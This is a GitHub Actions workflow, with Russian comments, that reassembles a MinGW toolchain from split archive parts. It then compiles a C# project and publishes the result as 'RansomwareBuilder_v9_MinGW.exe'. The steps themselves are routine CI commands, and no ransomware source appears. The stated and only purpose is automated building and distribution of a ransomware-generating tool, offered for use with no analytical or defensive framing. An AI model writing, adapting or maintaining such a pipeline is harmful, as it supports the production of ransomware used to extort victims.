name: Build Ransomware Builder v9.0 (MinGW)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== СОБИРАЕМ MINGW ИЗ 3 ЧАСТЕЙ ==========
    - name: Assemble MinGW
      run: |
        Write-Host "=== Assembling MinGW from parts ==="
        $files = Get-ChildItem mingw.zip.part*
        Write-Host "Found $($files.Count) parts"
        $out = [System.IO.File]::OpenWrite("mingw.zip")
        foreach ($f in $files) {
          Write-Host "  [+] $($f.Name) ($([math]::Round($f.Length/1MB, 2)) MB)"
          $data = [System.IO.File]::ReadAllBytes($f.FullName)
          $out.Write($data, 0, $data.Length)
        }
        $out.Close()
        
        if (Test-Path mingw.zip) {
          $size = (Get-Item mingw.zip).Length
          Write-Host "=== MinGW assembled successfully ($([math]::Round($size/1MB, 2)) MB) ==="
        } else {
          Write-Host "=== MinGW assembly failed ==="
          exit 1
        }
    
    # ========== СБОРКА БИЛДЕРА (C#) ==========
    - name: Setup MSBuild
      uses: microsoft/setup-msbuild@v2
    
    - name: Restore NuGet packages
      run: |
        dotnet restore builder.csproj --runtime win-x86
    
    - name: Build Builder
      run: |
        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
        
        if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
          Write-Host "=== Build SUCCESS ==="
          Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
          Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v9_MinGW.exe"
        } else {
          Write-Host "=== Build FAILED ==="
          exit 1
        }
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v9_MinGW
        path: RansomwareBuilder_v9_MinGW.exe
